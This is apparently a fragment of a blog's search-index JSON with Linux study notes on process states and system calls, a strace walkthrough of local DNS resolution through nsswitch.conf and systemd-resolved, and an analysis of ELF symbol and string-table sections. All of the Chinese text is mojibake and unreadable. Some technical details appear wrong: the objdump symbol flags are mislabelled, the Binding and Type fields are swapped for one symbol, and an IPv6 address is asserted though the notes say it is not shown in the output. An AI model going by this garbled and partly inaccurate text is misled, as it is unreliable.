å¦‚ä½¿ç”¨ SIGSTOP ä¿¡å·ï¼Œæš‚åœçš„è¿›ç¨‹ã€‚\nd_state.c code d_state.c#include \u003cunistd.h\u003e int main(){ pause(); } gcc -o d_state d_state.c ./d_state ps aux | grep d_state kill -SIGTSTP $(pidof d_state) ps aux | grep d_state Zombie(Z) è¿›ç¨‹å·²ç»æ‰§è¡Œäº† exit, exit code è¿˜æ²¡æœ‰è¢«çˆ¶è¿›ç¨‹ wait/waitpid è¯»å–ã€‚ä¹Ÿå°±æ˜¯è¿›ç¨‹çš„ PCB è¿˜æ²¡æœ‰ä» kernel çš„ process table ä¸­æ¸…é™¤ã€‚\nzombie.c code zombie.c#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csched.h\u003e int main() { pid_t child_pid = fork(); if (child_pid == 0) { // Child process printf(\"Child PID: %d\\n\", getpid()); exit(0); // Child exits immediately } else { // Parent process printf(\"Parent PID: %d\\n\", getpid()); printf(\"Child PID: %d\\n\", child_pid); printf(\"Parent is sleeping (check for zombie with `ps`).\\n\"); sleep(30); // Parent sleeps (does not call wait()) printf(\"Parent exiting.\\n\"); } return 0; } gcc -o zombie zombie.c ./zombie ps aux | grep zombie ","summary-table#Summary Table":" System Call Purpose Key State Change fork() Create child process Child â†’ Runnable execve() Replace process image Process runs new code exit() Terminate process Process â†’ Zombie wait() Wait for child state change Parent â†’ Sleeping kill() Send signal (e.g., stop/resume) Target â†’ Stopped/Running pause() Sleep until signal Process â†’ Sleeping ptrace() Debug/trace another process Target â†’ Stopped clone() Create thread/process New entity â†’ Runnable These system calls and signals form the backbone of process lifecycle management in Linux, enabling creation, termination, synchronization, and debugging of processes.","system-calls-changing-process-state-on-linux#system calls changing process state on Linux":"fork() å¤åˆ¶çŠ¶æ€æœºå™¨ â€¢ Purpose: Creates a new child process by duplicating the parent process.\nâ€¢ State Change: The child starts in the ready/runnable state (waiting for CPU time).\nâ€¢ Parameters: None.\nâ€¢ Return Value:\nâ€¢ 0 to the child process.\nâ€¢ Child's PID to the parent.\nâ€¢ -1 on error.\nâ€¢ Example: Used in spawning new processes (e.g., shell commands).\nexecve() å¤ä½çŠ¶æ€æœº â€¢ Purpose: Replaces the current processâ€™s memory space with a new program.\nâ€¢ State Change: The process remains in the running state but executes new code.\nâ€¢ Parameters:\nâ€¢ path: Path to the executable.\nâ€¢ argv: Command-line arguments.\nâ€¢ envp: Environment variables.\nâ€¢ Return Value: Only returns on error (-1).\nâ€¢ Example: Running programs like ls or grep from a shell.\nexit() / _exit() é”€æ¯çŠ¶æ€æœº â€¢ Purpose: Terminates the current process.\nâ€¢ State Change: Moves the process to zombie (until the parent calls wait()).\nâ€¢ Parameters:\nâ€¢ status: Exit status code.\nâ€¢ Return Value: None (does not return).\nâ€¢ Difference: exit() flushes buffers; _exit() is a raw system call.\nâ€¢ Example: Clean termination after program completion.\nwait() / waitpid() ç­‰å¾…å­è¿›ç¨‹é€€å‡º â€¢ Purpose: Suspends the parent until a child changes state (exits or stops).\nâ€¢ State Change: Parent enters sleeping state until child exits.\nâ€¢ Parameters:\nâ€¢ status: Stores childâ€™s exit status.\nâ€¢ pid: Specific child to wait for (in waitpid).\nâ€¢ Return Value: Child PID on success; -1 on error.\nâ€¢ Example: Parent process ensuring a child completes first.\nkill() / raise() å‘é€ä¿¡å· â€¢ Purpose: Sends signals to processes (e.g., SIGTERM, SIGSTOP).\nâ€¢ State Change:\nâ€¢ SIGSTOP: Moves process to stopped state.\nâ€¢ SIGCONT: Resumes a stopped process.\nâ€¢ SIGKILL: Terminates immediately.\nâ€¢ Parameters:\nâ€¢ pid: Target process ID.\nâ€¢ sig: Signal to send.\nâ€¢ Return Value: 0 on success; -1 on error.\nâ€¢ Example: Terminating a frozen process via kill -9 PID.\npause() æš‚åœè¿›ç¨‹ï¼Œç›´åˆ°æ”¶åˆ°ä¿¡å· â€¢ Purpose: Suspends the process until a signal is received.\nâ€¢ State Change: Process enters interruptable sleeping state.\nâ€¢ Parameters: None.\nâ€¢ Return Value: Always -1 (interrupted by signal).\nâ€¢ Example: Waiting indefinitely for user input or signals.\nnanosleep() æš‚åœè¿›ç¨‹ä¸€æ®µæ—¶é—´ â€¢ Purpose: Pauses execution for a specified time.\nâ€¢ State Change: Process enters interruptible sleep.\nâ€¢ Parameters:\nâ€¢ req: Time to sleep.\nâ€¢ rem: Remaining time if interrupted.\nâ€¢ Return Value: 0 on success; -1 on error.\nâ€¢ Example: High-precision delays in real-time applications.\nptrace() å…è®¸è¿›ç¨‹æ§åˆ¶å¦ä¸€ä¸ªè¿›ç¨‹ â€¢ Purpose: Allows a process to control another (debugging, tracing).\nâ€¢ State Change: Traced process enters stopped state on signals.\nâ€¢ Parameters:\nâ€¢ request: Action (e.g., PTRACE_ATTACH, PTRACE_CONT).\nâ€¢ pid: Target process ID.\nâ€¢ Return Value: Varies by request; -1 on error.\nâ€¢ Example: Debuggers like gdb using breakpoints.\nclone() â€¢ Purpose: Creates a child process or thread with configurable behavior.\nâ€¢ State Change: New process/thread starts in ready state.\nâ€¢ Parameters:\nâ€¢ fn: Function for the child to execute.\nâ€¢ flags: Options (e.g., CLONE_VM for shared memory).\nâ€¢ arg: Arguments for fn.\nâ€¢ Return Value: Child PID on success; -1 on error.\nâ€¢ Example: Implementing threads (used by pthread library).\nsched_yield() ä¸»åŠ¨æ”¾å¼ƒ CPU â€¢ Purpose: Voluntarily yields the CPU to other processes/threads.\nâ€¢ State Change: Process moves from running to ready state.\nâ€¢ Parameters: None.\nâ€¢ Return Value: 0 on success; -1 on error.\nâ€¢ Example: Cooperative multitasking in real-time apps.\nexit_group() é”€æ¯è¿›ç¨‹ä¸­æ‰€æœ‰çº¿ç¨‹ â€¢ Purpose: Terminates all threads in a process.\nâ€¢ State Change: All threads enter zombie state.\nâ€¢ Parameters:\nâ€¢ status: Exit code.\nâ€¢ Return Value: Does not return.\nâ€¢ Example: Terminating multi-threaded applications.","è¿›ç¨‹çŠ¶æ€æœº#è¿›ç¨‹çŠ¶æ€æœº":"æœ€è¿‘åœ¨çœ‹å—äº¬å¤§å­¦è’‹ç‚å²©è€å¸ˆçš„ 2025 æ“ä½œç³»ç»Ÿè¯¾ç¨‹ã€‚é‡Œé¢æœ‰ä¸€å¥è¯, è®¡ç®—æœºä¸­çš„ä¸€åˆ‡ç¨‹åºå¯ä»¥è§†ä¸º state machineã€‚å¾ˆæœ‰å¯å‘ã€‚è¿›ç¨‹æœ‰åˆå§‹çŠ¶æ€, CPU è¿™ä¸ªæ— æƒ…çš„æ‰§è¡ŒæŒ‡ä»¤çš„æœºå™¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤åï¼Œç¨‹åºçš„çŠ¶æ€å°±å‘ç”Ÿäº†å˜åŒ–ã€‚"},"title":"Linux Process State"},"/blog/master-dns-resolve-steps/":{"data":{"":" åˆ†æç¯å¢ƒ mint21","linux-ä¸Š-dns-è§£ææµç¨‹#linux ä¸Š DNS è§£ææµç¨‹":" ä»¥ ping -c 1 baidu.com ä¸ºä¾‹ ping strace æ—¥å¿—ï¼Œåˆ†æ ping å¦‚ä½•æ‹¿åˆ° baidu.com çš„ IP, å‘ç›®æ ‡ IP å‘é€ ICMP sudo strace -f -o ping.log -e trace=execve,access,openat,socket,connect,newfstatat,sendmmsg,recvfrom,sendto,recvmsg,write ping -c 1 baidu.com 1. Start the ping Process execve(\"/usr/bin/ping\", [\"ping\", \"-c\", \"1\", \"baidu.com\"], 0x7ffce9f3de88 /* 26 vars */) = 0 The ping command begins execution. 2. Load Required Libraries openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libidn2.so.0\", O_RDONLY|O_CLOEXEC) = 3 Libraries like libc (C standard library) and libidn2 (Internationalized Domain Names) are loaded for DNS resolution and string handling. å¤„ç†å›½é™…åŒ–, éè‹±æ–‡å­—æ¯çš„åŸŸå 3. Check for nscd (Name Service Cache Daemon) æ£€æŸ¥ç¼“å­˜ connect(5, {sa_family=AF_UNIX, sun_path=\"/var/run/nscd/socket\"}, 110) = -1 ENOENT (No such file or directory) The system tries to use nscd for cached DNS lookups but fails because /var/run/nscd/socket does not exist. This means caching is disabled or nscd is not running. æŸ¥çœ‹ nscd DNS ç¼“å­˜, è¿™ä¸ªæœåŠ¡é»˜è®¤æ²¡æœ‰å®‰è£… 4. Read /etc/nsswitch.conf è·å– DNS è§£ææœåŠ¡é¡ºåº openat(AT_FDCWD, \"/etc/nsswitch.conf\", O_RDONLY|O_CLOEXEC) = 5 The system reads the Name Service Switch (NSS) configuration. This file defines the order of name resolution services (e.g., files for /etc/hosts, dns for DNS). å®šä¹‰äº† DNS è§£ææœåŠ¡çš„é¡ºåº /etc/nsswitch.conf å†…å®¹ # /etc/nsswitch.conf # # Example configuration of GNU Name Service Switch functionality. # If you have the `glibc-doc-reference' and `info' packages installed, try: # `info libc \"Name Service Switch\"' for information about this file. passwd: files systemd group: files systemd shadow: files systemd gshadow: files systemd hosts: files mdns4_minimal [NOTFOUND=return] dns myhostname networks: files protocols: db files services: db files ethers: db files rpc: db files netgroup: nis 1. hosts: Line hosts: files mdns4_minimal [NOTFOUND=return] dns myhostname Order of resolution-DNS è§£ææ ¸å¿ƒé€»è¾‘:\nfiles: Check /etc/hosts first (static hostname-to-IP mappings). mdns4_minimal: Use multicast DNS (mDNS) for .local names IPv4-only (common for local network devices). [NOTFOUND=return]: If mDNS returns â€œnot found,â€ stop here and donâ€™t proceed to dns or myhostname. dns: Use DNS (configured in /etc/resolv.conf). myhostname: Resolve the local machineâ€™s hostname to its IP addresses (loopback and network interfaces). Implications:\nFor regular domains (e.g., baidu.com): mDNS is skipped (since itâ€™s not .local), so DNS is used directly. For .local names: mDNS is prioritized, and DNS is ignored if mDNS fails. Security: Prevents DNS fallback for mDNS queries, avoiding potential conflicts. 2. passwd, group, shadow Lines passwd: files systemd group: files systemd shadow: files systemd Sources: files: Read from /etc/passwd, /etc/group, and /etc/shadow. systemd: Integrates with systemd for dynamic users (e.g., containerized services or transient users). Use Case: Ensures compatibility with modern systems using systemd-managed users (e.g., Docker containers). 3. netgroup Line netgroup: nis NIS (Network Information Service): Legacy protocol for centralized user/group management. Warning: NIS is insecure (plaintext communication). If unused, consider removing this line to avoid unnecessary risks. How This Affects DNS Resolution? 1. DNS Lookup Path For baidu.com (non-.local domain): Check /etc/hosts â†’ No match. Skip mdns4_minimal (not relevant for baidu.com). Query DNS via systemd-resolved (uses /etc/resolv.conf). Fallback to myhostname only if DNS fails (unlikely). 2. /etc/resolv.conf Integration The dns source uses settings from /etc/resolv.conf (e.g., nameserver 127.0.0.53 for systemd-resolved). systemd-resolved acts as a local DNS stub resolver, handling: DNSSEC validation. Caching. Split DNS (for VPNs). Check /etc/hosts openat(AT_FDCWD, \"/etc/hosts\", O_RDONLY|O_CLOEXEC) = 5 The system checks /etc/hosts for a static entry for baidu.com. If found, it skips DNS. No match is found here. åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œå¯»æ‰¾ç›®æ ‡åŸŸåçš„ IP, æ‰¾åˆ°ä¹‹åè¿”å› 5. Read /etc/resolv.conf openat(AT_FDCWD, \"/etc/resolv.conf\", O_RDONLY|O_CLOEXEC) = 5 è¯»å– DNS è§£æå™¨é…ç½®æ–‡ä»¶, çœŸæ­£çš„é…ç½®åœ¨ /run/systemd/resolve/stub-resolv.conf\ndynamic DNS configuration file managed by systemd-resolved, the local DNS stub resolver. It serves as the systemâ€™s primary DNS resolver configuration, ensuring applications route DNS queries through systemd-resolved for features like caching, DNSSEC validation, and split DNS (e.g., for VPNs). systemd-resolved local DNS stub resolver systemctl status systemd-resolved.service â— systemd-resolved.service - Network Name Resolution Loaded: loaded (/usr/lib/systemd/system/systemd-resolved.service; enabled; preset: enabled) Active: active (running) since Sat 2025-05-24 15:09:18 CST; 58min ago Docs: man:systemd-resolved.service(8) man:org.freedesktop.resolve1(5) https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-managers https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients Main PID: 622 (systemd-resolve) Status: \"Processing requests...\" Tasks: 1 (limit: 4545) Memory: 7.5M (peak: 8.0M) CPU: 269ms CGroup: /system.slice/systemd-resolved.service â””â”€622 /usr/lib/systemd/systemd-resolved /etc/resolv.conf å†…å®¹ # Run \"resolvectl status\" to see details about the uplink DNS servers # currently in use. # # Third party programs should typically not access this file directly, but only # through the symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a # different way, replace this symlink by a static file or a different symlink. # # See man:systemd-resolved.service(8) for details about the supported modes of # operation for /etc/resolv.conf. nameserver 127.0.0.53 options edns0 trust-ad search localdomain 1. nameserver 127.0.0.53 Purpose: All DNS queries from applications are sent to this local DNS stub resolver. 127.0.0.53 is a special loopback address used exclusively by systemd-resolved. The resolver listens on this address to handle queries from applications. Why Not a Public DNS Server? Applications don't communicate directly with public DNS servers (e.g., 8.8.8.8). Instead, they send queries to 127.0.0.53, and systemd-resolved forwards them to upstream DNS servers configured elsewhere. è¿æ¥æµ‹è¯• nc -zv 127.0.0.53 53 Connection to 127.0.0.53 53 port [tcp/domain] succeeded! 2. options edns0 trust-ad edns0: Enables EDNS(0) (Extension Mechanisms for DNS), allowing larger UDP packets (up to 4096 bytes instead of 512 bytes). Required for DNSSEC and modern DNS features like DNS over TLS (DoT). trust-ad: Tells the resolver to trust the AD (Authentic Data) bit in DNS responses. When DNSSEC validation is enabled, systemd-resolved validates DNS responses and sets the AD bit if valid. This option ensures applications trust the resolverâ€™s validation results. 3. search localdomain Purpose: Defines the search domain for unqualified hostnames (e.g., resolving myhost to myhost.localdomain). Behavior: If you run ping myhost, the resolver will attempt: myhost myhost.localdomain Avoids needing to type full FQDNs (Fully Qualified Domain Names) in local networks. 6. Query DNS via systemd-resolved socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 5 connect(5, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"127.0.0.53\")}, 16) = 0 sendmmsg(5, [{msg_hdr={...}, msg_len=38}, ...], 2, MSG_NOSIGNAL) = 2 A UDP socket is created to communicate with the DNS resolver (127.0.0.53:53). Two DNS queries are sent: A record query (IPv4 address) for baidu.com. AAAA record query (IPv6 address) for baidu.com. upstream DNS servers ä¸Šæ¸¸çš„ DNS æœåŠ¡å™¨ upstream DNS servers is external DNS servers that local DNS resolver forwards queries to for resolution\nThe actual upstream DNS servers (e.g., your ISPâ€™s DNS or 1.1.1.1) /etc/systemd/resolved.conf (static configuration). Dynamically via DHCP or VPN managers (e.g., NetworkManager). æŸ¥çœ‹ upstream DNS è§£æå™¨ä¿¡æ¯ resolvectl status Global Protocols: -LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported resolv.conf mode: stub Link 2 (ens33) Current Scopes: DNS Protocols: +DefaultRoute -LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported Current DNS Server: 172.16.222.2 DNS Servers: 172.16.222.2 DNS Domain: localdomain æ³¨æ„ resolv.conf mode: stub Current DNS Server å°±æ˜¯ä¸Šæ¸¸çš„ DNS æœåŠ¡å™¨\n7. Receive DNS Responses recvfrom(5, \"\\266L\\201\\200\\0\\1\\0\\2\\0\\0\\0\\1\\5baidu\\3com\\0\\0\\1\\0\\1\\300\\f\\0\\1\\0...\", 2048, 0, ...) = 70 recvfrom(5, \"\\261e\\201\\200\\0\\1\\0\\0\\0\\1\\0\\1\\5baidu\\3com\\0\\0\\34\\0\\1\\300\\f\\0\\6\\0...\", 65536, 0, ...) = 81 The DNS resolver returns: A record: 39.156.66.10 (IPv4 address for baidu.com). AAAA record: 2400:cb00:2048:1::681b:8093 (IPv6 address, but not shown in strace output). The ping command uses the IPv4 address 39.156.66.10 for the ICMP echo request. 8. Final Output write(1, \"PING baidu.com (39.156.66.10) 56\"..., 52) = 52 The resolved IP address is printed, and ping sends an ICMP packet to 39.156.66.10. Key Files and Services Involved /etc/nsswitch.conf: Controls the order of name resolution (e.g., files â†’ dns). /etc/resolv.conf: Specifies DNS servers (e.g., 127.0.0.53 for systemd-resolved). systemd-resolved: A local DNS stub resolver that handles queries and caches results. /etc/hosts: Static hostname-to-IP mappings (bypasses DNS if a match exists). ","references#References":" systemd-resolved.service nsswitch.conf gai.conf resolv.conf resolvectl Systemd-resolved ","æœ¬æ–‡æ€»ç»“#æœ¬æ–‡æ€»ç»“":" /etc/nsswitch.conf çš„ hosts é…ç½®æœ¬æœº DNS æœåŠ¡æŸ¥è¯¢çš„é¡ºåº, å³ /etc/hosts æ–‡ä»¶ç­‰ systemd-resolved å°±æ˜¯ä¼ è¯´ä¸­çš„ DNS stub dns resolver ç”± stub dns resolver å‘èµ·çš„æŸ¥è¯¢å°±æ˜¯ä¼ è¯´ä¸­çš„é€’å½’æŸ¥è¯¢ ","æœ¬æ–‡ç›®æ ‡#æœ¬æ–‡ç›®æ ‡":" å¼„æ‡‚åœ¨æœ¬æœºå‘å¤–éƒ¨çš„(ä¸Šæ¸¸çš„) DNS server å‘å‡ºæŸ¥è¯¢ä¹‹å‰, åœ¨æœ¬æœºçš„æŸ¥è¯¢æ­¥éª¤æ˜¯ä»€ä¹ˆï¼Ÿ "},"title":"Master Dns Resolve Steps"},"/blog/master-elf-sections-dynamic-link/":{"data":{"":"","dynamic-linking-æ¶‰åŠåˆ°çš„-section#\u003cstrong\u003eDynamic Linking æ¶‰åŠåˆ°çš„ section\u003c/strong\u003e":"","dynstr-section-åˆ†æ#\u003ccode\u003e.dynstr section åˆ†æ\u003c/code\u003e":"","dynsym-section-åˆ†æ#\u003ccode\u003e.dynsym section\u003c/code\u003e åˆ†æ":"Dynamic Linking æ¶‰åŠåˆ°çš„ section Section Type Purpose Example Command .dynamic DYNAMIC Contains metadata for the dynamic linker (e.g., needed libraries, symbol tables, relocations). readelf -d demo .plt PROGBITS Procedure Linkage Table: Stubs for external function calls (e.g., printf). objdump -d demo .got / .got.plt PROGBITS Global Offset Table: Stores resolved addresses for functions and variables. objdump -R demo .dynsym DYNSYM Dynamic symbol table (subset of .symtab) for runtime symbol resolution. readelf -s demo .dynstr STRTAB String table for symbol names in .dynsym. readelf -p .dynstr demo .gnu.hash GNU_HASH Optimized hash table for fast symbol lookup (replaces legacy .hash). readelf -p .gnu.hash demo .rela.dyn RELA Relocations for global variables (e.g., message). readelf -r demo .rela.plt RELA Relocations for function calls (e.g., printf). readelf -r demo .init_array INIT_ARRAY Array of constructor functions (marked with __attribute__((constructor))). readelf -s demo .fini_array FINI_ARRAY Array of destructor functions (marked with __attribute__((destructor))). readelf -s demo .interp PROGBITS Path to the dynamic linker (e.g., /lib64/ld-linux-x86-64.so.2). readelf -p .interp demo symbol table ç¬¦å·è¡¨åˆ†æ The objdump -t demo command displays the symbol table of the ELF executable demo. This table lists all symbols (functions, variables, sections, etc.) defined or referenced in the binary.\ndemo: file format elf64-x86-64 SYMBOL TABLE: 0000000000000000 l df *ABS*\t0000000000000000 Scrt1.o 000000000000038c l O .note.ABI-tag\t0000000000000020 __abi_tag 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 00000000000010b0 l F .text\t0000000000000000 deregister_tm_clones 00000000000010e0 l F .text\t0000000000000000 register_tm_clones 0000000000001120 l F .text\t0000000000000000 __do_global_dtors_aux 0000000000004020 l O .bss\t0000000000000001 completed.0 0000000000003db0 l O .fini_array\t0000000000000000 __do_global_dtors_aux_fini_array_entry 0000000000001160 l F .text\t0000000000000000 frame_dummy 0000000000003da0 l O .init_array\t0000000000000000 __frame_dummy_init_array_entry 0000000000000000 l df *ABS*\t0000000000000000 demo.c 0000000000004028 l O .bss\t0000000000000004 count.1 0000000000004014 l O .data\t0000000000000004 local_static.0 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 00000000000021f8 l O .eh_frame\t0000000000000000 __FRAME_END__ 0000000000000000 l df *ABS*\t0000000000000000 0000000000003dc0 l O .dynamic\t0000000000000000 _DYNAMIC 0000000000002078 l .eh_frame_hdr\t0000000000000000 __GNU_EH_FRAME_HDR 0000000000003fb0 l O .got\t0000000000000000 _GLOBAL_OFFSET_TABLE_ 0000000000004018 g O .data\t0000000000000008 message 0000000000000000 F *UND*\t0000000000000000 __libc_start_main@GLIBC_2.34 0000000000000000 w *UND*\t0000000000000000 _ITM_deregisterTMCloneTable 0000000000004000 w .data\t0000000000000000 data_start 0000000000000000 F *UND*\t0000000000000000 puts@GLIBC_2.2.5 0000000000004020 g .data\t0000000000000000 _edata 0000000000004010 g O .data\t0000000000000004 global_data 000000000000127c g F .fini\t0000000000000000 .hidden _fini 00000000000011d3 g F .text\t000000000000001a print_message 0000000000004024 g O .bss\t0000000000000004 global_bss 0000000000000000 F *UND*\t0000000000000000 printf@GLIBC_2.2.5 000000000000119f g F .text\t000000000000001a finalize 00000000000011b9 g F .text\t000000000000001a initialize 0000000000004000 g .data\t0000000000000000 __data_start 0000000000000000 w *UND*\t0000000000000000 __gmon_start__ 0000000000004008 g O .data\t0000000000000000 .hidden __dso_handle 0000000000002000 g O .rodata\t0000000000000004 _IO_stdin_used 0000000000004030 g .bss\t0000000000000000 _end 0000000000001080 g F .text\t0000000000000026 _start 0000000000001169 g F .text\t0000000000000036 counter 0000000000004020 g .bss\t0000000000000000 __bss_start 00000000000011ed g F .text\t000000000000008e main 0000000000004020 g O .data\t0000000000000000 .hidden __TMC_END__ 0000000000000000 w *UND*\t0000000000000000 _ITM_registerTMCloneTable 0000000000000000 w F *UND*\t0000000000000000 __cxa_finalize@GLIBC_2.2.5 0000000000001000 g F .init\t0000000000000000 .hidden _init General Format of Each Line Each line in the symbol table has the following format:\nADDRESS Binding TYPE SECTION SIZE NAME Key Fields in the Output Address (00000000000011d3)\nThe virtual memory address of the symbol (hexadecimal) For external/undefined symbols (*UND*), this is 0000000000000000 Binding (l, g, !, w, u)\nglobal(é»˜è®¤çš„)ã€localã€weak binding l: Local symbol (not visible outside the file; e.g., static functions/variables). g: Global symbol (externally visible; e.g., main, printf). !: Weak symbol (lower precedence during linking; not shown here). w: Weak symbol (unresolved). è¿˜æ²¡æœ‰è§£æ u: Unique global symbol (special case for symbol versioning). Type (df, O, F)\ndf: Debug file symbol (indicates source code filenames like demo.c). O: Object symbol (data variable, e.g., global_data). F: Function symbol (e.g., main, print_message). UND: Undefined symbol (external reference, must be resolved at link time). ABS: Absolute symbol (not associated with any section; e.g., constants). Section (*ABS*, .text, .data, .bss)\n*ABS*: Absolute address (no section). ä¸å±äºä»»ä½• section .text: Executable code (functions). æŒ‡ä»¤ .data: Initialized global/static variables. åˆå§‹åŒ–æ•°æ® .bss: Uninitialized global/static variables. æœªåˆå§‹åŒ–æ•°æ® .rodata: Read-only data (e.g., string literals). åªè¯»æ•°æ® *UND*: Undefined section (symbol requires external linkage). éœ€è¦å¤–éƒ¨é“¾æ¥ Size (0000000000000004)\nSize of the symbol (in bytes, hexadecimal). For example, count.1 (a static variable) occupies 4 bytes. Name (main, printf@GLIBC_2.2.5)\nSymbol name. For external symbols, versioning (e.g., @GLIBC_2.2.5) indicates the required library version. Key Symbols æ€»ç»“ Symbol Type Section Description _start gF .text Entry point of the program (CRT startup code). main gF .text Your main function. print_message gF .text A custom function defined in demo.c. global_data gO .data Initialized global variable. global_bss gO .bss Uninitialized global variable. message gO .data String literal (e.g., \"Hello, World!\"). puts@GLIBC_2.2.5 u UND *UND* External reference to puts from glibc. __libc_start_main UND *UND* CRT function to initialize the program. _edata, _end g .data, .bss Special symbols marking end of sections. Special Sections and Symbols crtstuff.c and Scrt1.o: Compiler-generated CRT (C Runtime) code for initialization/finalization. _ITM_*: Symbols for Intel Transactional Memory (unused unless compiling with -fgnu-tm). .init_array/.fini_array: Functions to run before/after main() (e.g., constructors/destructors). .eh_frame: Exception handling metadata (stack unwinding for exceptions or debugging). .got: Global Offset Table (for PIC/position-independent code). print_message åˆ†æ 00000000000011d3 g F .text 000000000000001a print_message Address: 0x11d3 (location of print_message in memory). Binding: F (function). Type: g (global), Section: .text (code section). Size: 0x1a (26 bytes). print_message ä»£ç å…± 26bytes Name: print_message (è‡ªå®šä¹‰çš„å‡½æ•°). printf@GLIBC_2.2.5 åˆ†æ 0000000000000000 F *UND* 0000000000000000 printf@GLIBC_2.2.5 Field Value Explanation Address 0000000000000000 Undefined symbols have no valid address (resolved at runtime). Binding (implicit g) Global binding (default for undefined symbols like printf). Not explicitly shown here. Type F Function (symbol is a function, not a variable). Section *UND* Undefined (external reference; resolved by the linker/loader). Size 0000000000000000 Size of the symbol (not applicable for undefined symbols). Name printf@GLIBC_2.2.5 Symbol name with versioning (from glibc). .dynstr section åˆ†æ [ 7] .dynstr STRTAB 0000000000000498 00000498 0000000000000094 0000000000000000 A 0 0 1 .dynstr äºŒè¿›åˆ¶æŸ¥çœ‹ xxd -s 0x498 -l 0x94 demo 00000498: 0070 7574 7300 5f5f 6c69 6263 5f73 7461 .puts.__libc_sta 000004a8: 7274 5f6d 6169 6e00 5f5f 6378 615f 6669 rt_main.__cxa_fi 000004b8: 6e61 6c69 7a65 0070 7269 6e74 6600 6c69 nalize.printf.li 000004c8: 6263 2e73 6f2e 3600 474c 4942 435f 322e bc.so.6.GLIBC_2. 000004d8: 322e 3500 474c 4942 435f 322e 3334 005f 2.5.GLIBC_2.34._ 000004e8: 4954 4d5f 6465 7265 6769 7374 6572 544d ITM_deregisterTM 000004f8: 436c 6f6e 6554 6162 6c65 005f 5f67 6d6f CloneTable.__gmo 00000508: 6e5f 7374 6172 745f 5f00 5f49 544d 5f72 n_start__._ITM_r 00000518: 6567 6973 7465 7254 4d43 6c6f 6e65 5461 egisterTMCloneTa 00000528: 626c 6500 ble. .dynstr æŸ¥çœ‹åˆ†æ .dynstr base = 0x498\nreadelf -p .dynstr demo String dump of section '.dynstr': [ 1] puts [ 6] __libc_start_main [ 18] __cxa_finalize [ 27] printf [ 2e] libc.so.6 [ 38] GLIBC_2.2.5 [ 44] GLIBC_2.34 [ 4f] _ITM_deregisterTMCloneTable [ 6b] __gmon_start__ [ 7a] _ITM_registerTMCloneTable [ 1] puts è·ç¦» .dynstr å¼€å§‹å¤„åç§»é‡ä¸º 1, ä¹Ÿå°±æ˜¯ 0x498 + 1 = 0x499ã€‚é•¿åº¦ä¸º 5ã€‚åŒ…å«ä¸€ä¸ª NULL terminator .strtab section åˆ†æ The .strtab section in an ELF file is the string table that stores null-terminated strings referenced by other sections, such as the symbol table (.symtab) and section names. These strings include:\nFunction names (e.g., main, printf) Variable names (e.g., global_data) Section names (e.g., .text, .data) Other identifiers used in the binary. It acts as a centralized repository for strings, allowing sections like .symtab to reference names via offsets (indices) into .strtab instead of embedding strings directly.\n.strtab section å­—æ®µè§£é‡Š From your readelf -S demo output:\n[35] .strtab STRTAB 0000000000000000 00003978 0000000000000245 0000000000000000 0 0 1 Field Value Explanation Name .strtab String table for symbol/section names. Type STRTAB Indicates a string table. Address 0x0000000000000000 Not loaded into memory (no runtime use). Offset 0x00003978 File offset to the start of the string table (14,712 bytes into the file). Size 0x0000000000000245 (581 bytes) Total size of the string table. Entry Size 0x0000000000000000 Not applicable (strings are variable-length). Flags None No special flags (not allocated in memory). Link 0 Not linked to another section (standalone). Info 0 No additional metadata. Alignment 1 Byte-aligned (strings are stored contiguously). Key Concepts Purpose of .strtab:\nStores human-readable names for symbols and sections. Reduces redundancy by allowing multiple entries to reference the same string via offset. How Symbols Use .strtab:\nThe symbol table (.symtab) references .strtab using the st_name field. Example: A symbol like main in .symtab has an st_name value (e.g., 0x123), which is an offset into .strtab. String Encoding:\nStrings are null-terminated (\\0). The first byte (offset 0x0) is always an empty string (\"\"), used as a placeholder. Not Loaded at Runtime:\nThe .strtab section is not marked as allocatable (A flag), so it is not loaded into memory during program execution. It is primarily used during linking and debugging. .strtab æ¢æ readelf -p demo readelf -p .strtab demo String dump of section '.strtab': [ 1] Scrt1.o [ 9] __abi_tag [ 13] crtstuff.c [ 1e] deregister_tm_clones [ 33] __do_global_dtors_aux [ 49] completed.0 [ 55] __do_global_dtors_aux_fini_array_entry [ 7c] frame_dummy [ 88] __frame_dummy_init_array_entry [ a7] demo.c [ ae] count.1 [ b6] local_static.0 [ c5] __FRAME_END__ [ d3] _DYNAMIC [ dc] __GNU_EH_FRAME_HDR [ ef] _GLOBAL_OFFSET_TABLE_ [ 105] __libc_start_main@GLIBC_2.34 [ 122] _ITM_deregisterTMCloneTable [ 13e] puts@GLIBC_2.2.5 [ 14f] _edata [ 156] global_data [ 162] _fini [ 168] print_message [ 176] global_bss [ 181] printf@GLIBC_2.2.5 [ 194] finalize [ 19d] initialize [ 1a8] __data_start [ 1b5] __gmon_start__ [ 1c4] __dso_handle [ 1d1] _IO_stdin_used [ 1e0] _end [ 1e5] counter [ 1ed] __bss_start [ 1f9] main [ 1fe] __TMC_END__ [ 20a] _ITM_registerTMCloneTable [ 224] __cxa_finalize@GLIBC_2.2.5 [ 23f] _init Differences Between .strtab and .dynstr Feature .strtab .dynstr Used by .symtab (full symbol table) .dynsym (dynamic symbol table) Loaded at Runtime? No (not allocatable) Yes (used by dynamic linker) Purpose Debugging, static linking Dynamic linking Size Larger (includes all symbols) Smaller (subset for runtime) Why .strtab Matters Symbol Resolution:\nThe symbol table (.symtab) relies on .strtab to associate names (e.g., printf) with addresses. Debugging:\nTools like gdb and nm use .strtab to display human-readable names during debugging. Stripped Binaries:\nIf .strtab is removed (via strip), symbols lose their names, making reverse engineering harder. .strtab section æ€»ç»“ .strtab is a string table storing names for symbols and sections. It is referenced by .symtab via offsets 